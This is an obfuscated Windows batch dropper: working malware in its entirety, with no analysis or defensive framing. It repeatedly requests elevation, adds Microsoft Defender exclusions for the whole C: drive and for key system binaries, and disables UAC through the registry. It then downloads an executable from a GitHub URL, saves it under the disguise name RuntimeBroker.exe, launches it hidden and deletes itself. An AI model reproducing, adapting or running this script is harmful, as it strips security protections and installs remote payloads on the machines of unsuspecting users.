@echo off & setlocal enableDelayedExpansion
set "rbjbC=NET" & set "xQT=2>&1" & set "GZlAm=SESSION" & set "tXLZ=>nul"
%rbjbC% %GZlAm% %tXLZ% %xQT%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "vltcM=foo" & set "vglxt=bar" & set "LtD=baz" & set "tPe=qux" & rem hyAcdP zlyi rLGxR
set "WJhc=powershell -ExecutionPolicy Bypass -Command"
set "FknKs=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "LxM='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "jpFH='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!WJhc! "!FknKs! !LxM! !jpFH!" %tXLZ% %xQT%
set "sCA=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "jgoX=-Name 'EnableLUA' -Value 0"
!WJhc! "!sCA! !jgoX!" %tXLZ% %xQT%
set "jVQO=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!WJhc! "!jVQO!" %tXLZ% %xQT%
if !errorlevel! neq 0 (goto %a%)
set "oLA=timeout /t" & !oLA! 2 %tXLZ% %xQT%
set "jRdqq=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "ZTh=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "UoU=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!WJhc! "!jRdqq! !ZTh! !UoU!" %tXLZ% %xQT%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!oLA! 1 %tXLZ% %xQT% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %tXLZ% %xQT%
del /f /q "%~f0" %tXLZ% %xQT%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %tXLZ% %xQT%
if !errorlevel! neq 0 (!oLA! 3 %tXLZ% %xQT% & goto %b%)
exit /b
